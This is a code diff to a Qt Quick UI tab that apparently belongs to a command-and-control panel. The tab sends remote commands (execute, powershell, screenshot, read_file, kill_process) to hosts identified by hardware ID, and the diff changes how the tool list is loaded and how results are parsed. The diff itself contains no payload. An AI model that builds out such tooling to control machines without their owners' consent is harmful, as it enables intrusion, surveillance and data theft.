@@ -1,6 +1,7 @@
 import QtQuick
 import QtQuick.Controls
 import QtQuick.Layouts
+import C2Panel
 
 Rectangle {
     id: mcpTab
@@ -8,9 +9,6 @@ Rectangle {
     property string cookie: ""
     property string hwid: ""
     color: "transparent"
-
-    property var toolNames: ["execute", "powershell", "list_processes", "screenshot", "screen_info",
-                             "list_directory", "read_file", "kill_process"]
 
     ColumnLayout {
         anchors.fill: parent; anchors.margins: Theme.spacingM; spacing: Theme.spacingM
@@ -22,7 +20,7 @@ Rectangle {
             Layout.fillWidth: true; spacing: 8
             ComboBox {
                 id: toolCombo; Layout.preferredWidth: 250
-                model: mcpTab.toolNames
+                model: mcp.toolList
                 font.pixelSize: 13
             }
             Button { text: "刷新工具列表"; onClicked: mcp.getToolList(hwid, serverUrl, cookie) }
@@ -48,7 +46,7 @@ Rectangle {
             Layout.preferredWidth: 160; Layout.preferredHeight: 36
             onClicked: {
                 mcp.callTool(hwid, serverUrl, cookie,
-                    toolCombo.currentText, paramInput.text)
+                    toolCombo.currentText, paramInput.text, "mcp")
             }
         }
 
@@ -73,8 +71,25 @@ Rectangle {
 
     Connections {
         target: mcp
-        function onToolResult(result) {
-            resultArea.text = result
+        function onToolResult(tool, result, source) {
+            if (source !== "mcp") return      // 其它页签的调用不再串到这里
+            if (tool === "tools/list") {
+                resultArea.text = "已刷新工具列表（共 " + mcp.toolList.length + " 个）"
+                return
+            }
+            // 解析后再展示：不要直接显示原始 JSON 文本，也不要靠子串判错
+            try {
+                var obj = JSON.parse(result)
+                if (obj.error !== undefined) {
+                    resultArea.text = "[error] " + obj.error
+                } else if (obj.content && obj.content[0] && obj.content[0].text !== undefined) {
+                    resultArea.text = obj.content[0].text
+                } else {
+                    resultArea.text = JSON.stringify(obj, null, 2)
+                }
+            } catch (e) {
+                resultArea.text = result
+            }
         }
     }
 }
